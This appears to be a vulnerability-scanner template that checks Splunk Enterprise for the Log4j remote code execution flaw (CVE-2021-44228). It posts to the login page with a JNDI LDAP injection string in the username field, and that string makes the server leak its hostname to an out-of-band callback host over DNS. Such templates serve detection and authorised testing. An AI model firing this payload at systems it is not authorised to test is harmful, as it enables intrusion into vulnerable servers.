id: splunk-enterprise-log4j-rce
brief:
    title: Splunk Enterprise - Remote Code Execution (Apache Log4j)
    by: shaikhyaser
    level: critical
    about: Splunk Enterprise is susceptible to Log4j JNDI remote code execution. Splunk Enterprise enables you to search, analyze and visualize your data to quickly act on insights from across your technology...
    label:
        - cve
        - cve2021
        - rce
        - jndi
        - log4j
        - splunk
        - oast
        - kev
        - vuln
    score: CVE-2021-44228 CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/en-US/account/login'
      head:
        Accept: text/javascript, text/html, application/xml, text/xml, /
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: '{{RootURL}}'
        Referer: '{{RootURL}}'
        X-Requested-With: XMLHttpRequest
      body: cval={{unix_time()}}&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}&return_to=%2Fen-US%2F
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
